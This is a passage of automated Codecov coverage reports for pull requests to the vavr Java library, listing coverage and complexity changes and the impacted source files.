<.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2038      +/-\n============================================\n+ Coverage     97.54%   97.55%   +<.01%   \n- Complexity     5190     5200      +10   \n============================================\n  Files            91       91            \n  Lines         11914    11928      +14   \n  Branches       1576     1574       -2   \n============================================\n+ Hits          11622    11636      +14   \n  Misses          144      144            \n  Partials        148      148\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...rc/main/java/io/vavr/collection/PriorityQueue.java | 98.66% <\u00f8> (-0.02%) | 107 <0> (-1) | |\n| ...vr/src/main/java/io/vavr/collection/LinearSeq.java | 96.7% <\u00f8> (\u00f8) | 20 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Seq.java | 98% <\u00f8> (\u00f8) | 50 <0> (\u00f8) | :arrow_down: |\n| .../src/main/java/io/vavr/collection/Traversable.java | 99.45% <\u00f8> (\u00f8) | 111 <0> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/collection/IndexedSeq.java | 97.39% <\u00f8> (\u00f8) | 37 <0> (\u00f8) | :arrow_down: |\n| .../src/main/java/io/vavr/collection/Collections.java | 94.11% <100%> (+0.3%) | 111 <6> (+6) | :arrow_up: |\n| ...rc/main/java/io/vavr/collection/AbstractQueue.java | 100% <100%> (\u00f8) | 22 <1> (+1) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/CharSeq.java | 99.81% <100%> (-0.01%) | 346 <3> (-2) | |\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.52% <100%> (-0.01%) | 240 <3> (\u00f8) | |\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.68% <100%> (-0.01%) | 208 <3> (\u00f8) | |\n| ... and 3 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 18b9564...f20bf43. Read the comment docs.\n. # Codecov Report\nMerging #2040 into master will decrease coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2040      +/-\n============================================\n- Coverage     97.56%   97.55%   -0.01%   \n+ Complexity     5203     5202       -1   \n============================================\n  Files            91       91            \n  Lines         11931    11929       -2   \n  Branches       1574     1574            \n============================================\n- Hits          11640    11637       -3   \n  Misses          144      144            \n- Partials        147      148       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 82.05% <100%> (-1.7%) | 21 <0> (-1) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update a345592...272bb5f. Read the comment docs.\n. # Codecov Report\nMerging #2042 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2042   +/-\n=========================================\n  Coverage     97.55%   97.55%         \n  Complexity     5202     5202         \n=========================================\n  Files            91       91         \n  Lines         11929    11929         \n  Branches       1574     1574         \n=========================================\n  Hits          11637    11637         \n  Misses          144      144         \n  Partials        148      148\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 8176791...b646c4d. Read the comment docs.\n. # Codecov Report\nMerging #2043 into master will increase coverage by <.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2043      +/-\n============================================\n+ Coverage     97.55%   97.56%   +<.01%   \n- Complexity     5202     5203       +1   \n============================================\n  Files            91       91            \n  Lines         11929    11929            \n  Branches       1574     1574            \n============================================\n+ Hits          11637    11638       +1   \n  Misses          144      144            \n+ Partials        148      147       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 83.33% <0%> (+1.28%) | 22% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 8176791...018f4e7. Read the comment docs.\n. # Codecov Report\nMerging #2047 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2047      +/-\n============================================\n+ Coverage     97.55%   97.55%   +<.01%   \n- Complexity     5202     5203       +1   \n============================================\n  Files            91       91            \n  Lines         11929    11930       +1   \n  Branches       1574     1574            \n============================================\n+ Hits          11637    11638       +1   \n  Misses          144      144            \n  Partials        148      148\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...avr/src/main/java/io/vavr/collection/Multimap.java | 98.33% <\u00f8> (\u00f8) | 28 <0> (\u00f8) | :arrow_down: |\n| ...main/java/io/vavr/collection/AbstractMultimap.java | 97.19% <100%> (+0.01%) | 126 <1> (+1) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update aec45f3...77b5549. Read the comment docs.\n. # Codecov Report\nMerging #2050 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2050   +/-\n=========================================\n  Coverage     97.55%   97.55%         \n  Complexity     5202     5202         \n=========================================\n  Files            91       91         \n  Lines         11929    11929         \n  Branches       1574     1574         \n=========================================\n  Hits          11637    11637         \n  Misses          144      144         \n  Partials        148      148\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update aec45f3...c3ff22e. Read the comment docs.\n. # Codecov Report\nMerging #2058 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2058      +/-\n============================================\n- Coverage     97.55%   97.54%   -0.01%   \n  Complexity     5202     5202            \n============================================\n  Files            91       92       +1   \n  Lines         11929    11930       +1   \n  Branches       1574     1574            \n============================================\n  Hits          11637    11637            \n- Misses          144      145       +1   \n  Partials        148      148\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/PartialFunction.java | 0% <0%> (\u00f8) | 0 <0> (?) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 19e7cfb...b6af0be. Read the comment docs.\n. # Codecov Report\nMerging #2061 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2061   +/-\n=========================================\n  Coverage     97.55%   97.55%         \n  Complexity     5203     5203         \n=========================================\n  Files            92       92         \n  Lines         11930    11930         \n  Branches       1574     1574         \n=========================================\n  Hits          11638    11638         \n+ Misses          145      144    -1   \n- Partials        147      148    +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <100%> (\u00f8) | 44 <0> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 82.05% <0%> (-1.29%) | 21% <0%> (-1%) | |\n| vavr/src/main/java/io/vavr/PartialFunction.java | 100% <0%> (+100%) | 1% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 09e2fbc...91a5dba. Read the comment docs.\n. # Codecov Report\nMerging #2066 into master will decrease coverage by 0.01%.\nThe diff coverage is 90%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2066      +/-\n============================================\n- Coverage     97.56%   97.55%   -0.02%   \n  Complexity     5204     5204            \n============================================\n  Files            92       92            \n  Lines         11930    11932       +2   \n  Branches       1574     1574            \n============================================\n  Hits          11640    11640            \n- Misses          143      144       +1   \n- Partials        147      148       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/Predicates.java | 85.71% <90%> (+1.5%) | 20 <10> (+1) | :arrow_up: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 82.05% <0%> (-2.57%) | 21% <0%> (-1%) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1680407...edad3a5. Read the comment docs.\n. # Codecov Report\nMerging #2067 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2067   +/-\n=========================================\n  Coverage     97.55%   97.55%         \n  Complexity     5204     5204         \n=========================================\n  Files            92       92         \n  Lines         11932    11932         \n  Branches       1574     1574         \n=========================================\n  Hits          11640    11640         \n  Misses          144      144         \n  Partials        148      148\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/Predicates.java | 85.71% <\u00f8> (\u00f8) | 20 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update d66fb59...39adfc7. Read the comment docs.\n. # Codecov Report\nMerging #2069 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2069   +/-\n=========================================\n  Coverage     97.55%   97.55%         \n  Complexity     5204     5204         \n=========================================\n  Files            92       92         \n  Lines         11932    11932         \n  Branches       1574     1574         \n=========================================\n  Hits          11640    11640         \n  Misses          144      144         \n  Partials        148      148\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0170201...94023b2. Read the comment docs.\n. # Codecov Report\nMerging #2070 into master will decrease coverage by <.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2070      +/-\n============================================\n- Coverage     97.55%   97.55%   -0.01%   \n  Complexity     5204     5204            \n============================================\n  Files            92       92            \n  Lines         11932    11930       -2   \n  Branches       1574     1572       -2   \n============================================\n- Hits          11640    11638       -2   \n  Misses          144      144            \n  Partials        148      148\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 99.55% <\u00f8> (\u00f8) | 112 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction8.java | 97.14% <\u00f8> (\u00f8) | 14 <0> (\u00f8) | :arrow_down: |\n| .../src/main/java/io/vavr/collection/Traversable.java | 99.45% <\u00f8> (\u00f8) | 111 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple4.java | 100% <\u00f8> (\u00f8) | 39 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function1.java | 96% <\u00f8> (\u00f8) | 15 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple0.java | 100% <\u00f8> (\u00f8) | 14 <0> (\u00f8) | :arrow_down: |\n| ...c/main/java/io/vavr/collection/JavaConverters.java | 90.58% <\u00f8> (\u00f8) | 1 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function8.java | 95.83% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| ...c/main/java/io/vavr/match/annotation/Patterns.java | 68.18% <\u00f8> (\u00f8) | 15 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/TreeSet.java | 100% <\u00f8> (\u00f8) | 170 <0> (\u00f8) | :arrow_down: |\n| ... and 84 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 3db51f8...b2b2674. Read the comment docs.\n. # Codecov Report\nMerging #2072 into master will decrease coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2072      +/-\n============================================\n- Coverage     97.55%   97.55%   -0.01%   \n  Complexity     5204     5204            \n============================================\n  Files            92       92            \n  Lines         11932    11930       -2   \n  Branches       1574     1572       -2   \n============================================\n- Hits          11640    11638       -2   \n  Misses          144      144            \n  Partials        148      148\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Either.java | 100% <100%> (\u00f8) | 45 <3> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 3db51f8...8f34732. Read the comment docs.\n. # Codecov Report\nMerging #2073 into master will increase coverage by <.01%.\nThe diff coverage is 90.32%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2073      +/-\n============================================\n+ Coverage     97.13%   97.14%   +<.01%   \n+ Complexity     5264     5262       -2   \n============================================\n  Files            93       93            \n  Lines         12145    12143       -2   \n  Branches       1589     1589            \n============================================\n- Hits          11797    11796       -1   \n+ Misses          194      193       -1   \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/$.java | 63.15% <\u00f8> (+6.01%) | 0 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Value.java | 93.72% <100%> (+0.35%) | 141 <0> (-3) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Validation.java | 98.14% <89.28%> (-0.92%) | 58 <3> (+1) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 09d802d...7999495. Read the comment docs.\n. # Codecov Report\nMerging #2076 into master will decrease coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2076      +/-\n============================================\n- Coverage     97.55%   97.55%   -0.01%   \n+ Complexity     5204     5200       -4   \n============================================\n  Files            92       92            \n  Lines         11930    11923       -7   \n  Branches       1572     1570       -2   \n============================================\n- Hits          11638    11631       -7   \n  Misses          144      144            \n  Partials        148      148\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Map.java | 100% <100%> (\u00f8) | 34 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/TreeMap.java | 94.07% <100%> (\u00f8) | 157 <1> (\u00f8) | :arrow_down: |\n| ...avr/src/main/java/io/vavr/collection/Multimap.java | 98.33% <100%> (\u00f8) | 28 <0> (\u00f8) | :arrow_down: |\n| ...main/java/io/vavr/collection/AbstractMultimap.java | 97.17% <100%> (\u00f8) | 125 <1> (\u00f8) | :arrow_down: |\n| .../src/main/java/io/vavr/collection/Traversable.java | 99.42% <100%> (-0.03%) | 107 <2> (-4) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1e6af93...ed71f35. Read the comment docs.\n. # Codecov Report\nMerging #2077 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2077      +/-\n============================================\n+ Coverage     97.55%   97.55%   +<.01%   \n- Complexity     5204     5207       +3   \n============================================\n  Files            92       92            \n  Lines         11930    11938       +8   \n  Branches       1572     1574       +2   \n============================================\n+ Hits          11638    11646       +8   \n  Misses          144      144            \n  Partials        148      148\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Either.java | 100% <100%> (\u00f8) | 48 <3> (+3) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1e6af93...184595a. Read the comment docs.\n. # Codecov Report\nMerging #2078 into master will decrease coverage by 0.04%.\nThe diff coverage is 90.16%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2078      +/-\n============================================\n- Coverage     97.55%   97.51%   -0.05%   \n+ Complexity     5208     5193      -15   \n============================================\n  Files            92       92            \n  Lines         11941    11942       +1   \n  Branches       1574     1575       +1   \n============================================\n- Hits          11649    11645       -4   \n- Misses          144      148       +4   \n- Partials        148      149       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...src/main/java/io/vavr/collection/RedBlackTree.java | 90.9% <\u00f8> (-0.45%) | 23 <0> (-5) | |\n| vavr/src/main/java/io/vavr/collection/TreeMap.java | 93.33% <0%> (-0.74%) | 157 <0> (\u00f8) | |\n| .../src/main/java/io/vavr/collection/Comparators.java | 63.63% <0%> (-14.15%) | 1 <0> (\u00f8) | |\n| vavr/src/main/java/io/vavr/collection/TreeSet.java | 100% <100%> (\u00f8) | 166 <4> (-4) | :arrow_down: |\n| .../src/main/java/io/vavr/collection/Traversable.java | 98.44% <96.15%> (-1.01%) | 104 <8> (-7) | |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 84.61% <0%> (+2.56%) | 22% <0%> (+1%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update ee3f1b1...593de27. Read the comment docs.\n. # Codecov Report\nMerging #2079 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2079      +/-\n============================================\n+ Coverage     97.55%   97.55%   +<.01%   \n  Complexity     5208     5208            \n============================================\n  Files            92       92            \n  Lines         11939    11941       +2   \n  Branches       1574     1574            \n============================================\n+ Hits          11647    11649       +2   \n  Misses          144      144            \n  Partials        148      148\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Map.java | 100% <\u00f8> (\u00f8) | 34 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/TreeMap.java | 94.07% <100%> (\u00f8) | 157 <1> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Value.java | 93.6% <100%> (+0.05%) | 144 <2> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update ec2d9b4...65bd294. Read the comment docs.\n. # Codecov Report\nMerging #2080 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2080   +/-\n=========================================\n  Coverage     97.55%   97.55%         \n  Complexity     5208     5208         \n=========================================\n  Files            92       92         \n  Lines         11939    11939         \n  Branches       1574     1574         \n=========================================\n  Hits          11647    11647         \n  Misses          144      144         \n  Partials        148      148\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update ec2d9b4...844eaea. Read the comment docs.\n. # Codecov Report\nMerging #2084 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2084   +/-\n=========================================\n  Coverage     97.55%   97.55%         \n  Complexity     5208     5208         \n=========================================\n  Files            92       92         \n  Lines         11939    11939         \n  Branches       1574     1574         \n=========================================\n  Hits          11647    11647         \n  Misses          144      144         \n  Partials        148      148\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...avr/src/main/java/io/vavr/collection/Iterator.java | 99.21% <\u00f8> (\u00f8) | 177 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update ec2d9b4...837435b. Read the comment docs.\n. # Codecov Report\nMerging #2088 into master will decrease coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2088      +/-\n============================================\n- Coverage     97.49%   97.49%   -0.01%   \n+ Complexity     5192     5188       -4   \n============================================\n  Files            92       92            \n  Lines         11942    11928      -14   \n  Branches       1575     1575            \n============================================\n- Hits          11643    11629      -14   \n  Misses          149      149            \n  Partials        150      150\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Seq.java | 98% <\u00f8> (\u00f8) | 50 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Queue.java | 96.71% <100%> (-0.04%) | 198 <1> (-1) | |\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.52% <100%> (-0.01%) | 239 <1> (-1) | |\n| .../src/main/java/io/vavr/collection/Collections.java | 94.25% <100%> (+0.14%) | 113 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/Stream.java | 99% <100%> (-0.01%) | 263 <1> (-1) | |\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.68% <100%> (-0.01%) | 207 <1> (-1) | |\n| vavr/src/main/java/io/vavr/collection/CharSeq.java | 99.81% <100%> (-0.01%) | 345 <1> (-1) | |\n| vavr/src/main/java/io/vavr/collection/List.java | 99.62% <100%> (-0.01%) | 263 <1> (-1) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 64076ce...8aa2d2a. Read the comment docs.\n. # Codecov Report\nMerging #2089 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2089   +/-\n=========================================\n  Coverage     97.49%   97.49%         \n  Complexity     5188     5188         \n=========================================\n  Files            92       92         \n  Lines         11928    11928         \n  Branches       1575     1575         \n=========================================\n  Hits          11629    11629         \n  Misses          149      149         \n  Partials        150      150\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1d304e6...6af2e54. Read the comment docs.\n. # Codecov Report\nMerging #2090 into master will decrease coverage by 0.08%.\nThe diff coverage is 0%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2090      +/-\n============================================\n- Coverage     97.49%   97.41%   -0.09%   \n  Complexity     5188     5188            \n============================================\n  Files            92       92            \n  Lines         11928    11938      +10   \n  Branches       1575     1575            \n============================================\n  Hits          11629    11629            \n- Misses          149      159      +10   \n  Partials        150      150\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/PartialFunction.java | 9.09% <0%> (-90.91%) | 1 <0> (\u00f8) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 3ad5dfe...5280c47. Read the comment docs.\n. # Codecov Report\n:exclamation: No coverage uploaded for pull request base (master@c05946e). Click here to learn what that means.\nThe diff coverage is 89.4%.\n\n\n```diff\n@@           Coverage Diff            @@\nmaster   #2093   +/-\n========================================\n  Coverage          ?   97.4%         \n  Complexity        ?    5196         \n========================================\n  Files             ?      92         \n  Lines             ?   11909         \n  Branches          ?    1573         \n========================================\n  Hits              ?   11600         \n  Misses            ?     154         \n  Partials          ?     155\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/Value.java | 93.51% <\u00f8> (\u00f8) | 143 <0> (?) | |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 78.44% <79.03%> (\u00f8) | 26 <14> (?) | |\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 97.95% <96.62%> (\u00f8) | 120 <49> (?) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update c05946e...5a1ca80. Read the comment docs.\n. # Codecov Report\nMerging #2094 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2094   +/-\n=========================================\n  Coverage     97.49%   97.49%         \n  Complexity     5188     5188         \n=========================================\n  Files            92       92         \n  Lines         11928    11928         \n  Branches       1575     1575         \n=========================================\n  Hits          11629    11629         \n  Misses          149      149         \n  Partials        150      150\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src-gen/main/java/io/vavr/Function1.java | 96% <\u00f8> (\u00f8) | 15 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function2.java | 94.44% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Function0.java | 93.75% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 3ad5dfe...d69b904. Read the comment docs.\n. # Codecov Report\nMerging #2096 into master will decrease coverage by 0.16%.\nThe diff coverage is 0%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2096      +/-\n============================================\n- Coverage     97.49%   97.33%   -0.17%   \n  Complexity     5188     5188            \n============================================\n  Files            92       94       +2   \n  Lines         11928    11948      +20   \n  Branches       1575     1577       +2   \n============================================\n  Hits          11629    11629            \n- Misses          149      169      +20   \n  Partials        150      150\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| .../java/io/vavr/concurrent/MemoizedConcurrently.java | 0% <0%> (\u00f8) | 0 <0> (?) | |\n| ...avr/concurrent/ConcurrentTrampoliningMemoizer.java | 0% <0%> (\u00f8) | 0 <0> (?) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 22ac105...2a3ed44. Read the comment docs.\n. # Codecov Report\nMerging #2101 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2101      +/-\n============================================\n+ Coverage     97.49%   97.49%   +<.01%   \n- Complexity     5188     5192       +4   \n============================================\n  Files            92       92            \n  Lines         11928    11940      +12   \n  Branches       1575     1577       +2   \n============================================\n+ Hits          11629    11641      +12   \n  Misses          149      149            \n  Partials        150      150\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <100%> (\u00f8) | 48 <4> (+4) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 22ac105...6119d0b. Read the comment docs.\n. # Codecov Report\nMerging #2103 into master will increase coverage by 0.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff             @@\nmaster   #2103      +/-\n===========================================\n+ Coverage     97.49%   97.5%   +0.01%   \n- Complexity     5188    5202      +14   \n===========================================\n  Files            92      92            \n  Lines         11928   11944      +16   \n  Branches       1575    1576       +1   \n===========================================\n+ Hits          11629   11646      +17   \n+ Misses          149     148       -1   \n  Partials        150     150\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...vr/src/main/java/io/vavr/collection/SortedSet.java | 100% <\u00f8> (\u00f8) | 2 <0> (-1) | :arrow_down: |\n| .../src/main/java/io/vavr/collection/Traversable.java | 98.38% <\u00f8> (-0.06%) | 101 <0> (-3) | |\n| ...main/java/io/vavr/collection/AbstractMultimap.java | 97.22% <100%> (+0.03%) | 127 <3> (+1) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/HashSet.java | 95.79% <100%> (+0.01%) | 139 <1> (+1) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/Queue.java | 96.72% <100%> (+0.01%) | 200 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/TreeSet.java | 100% <100%> (\u00f8) | 168 <2> (+2) | :arrow_up: |\n| .../src/main/java/io/vavr/collection/Collections.java | 94.44% <100%> (+0.18%) | 116 <3> (+3) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/List.java | 99.62% <100%> (\u00f8) | 264 <1> (+1) | :arrow_up: |\n| ...avr/src/main/java/io/vavr/collection/Iterator.java | 99.21% <100%> (\u00f8) | 178 <1> (+1) | :arrow_up: |\n| ...rc/main/java/io/vavr/collection/LinkedHashSet.java | 96.63% <100%> (+0.01%) | 144 <1> (+1) | :arrow_up: |\n| ... and 7 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 793ffd9...e35f279. Read the comment docs.\n. # Codecov Report\nMerging #2104 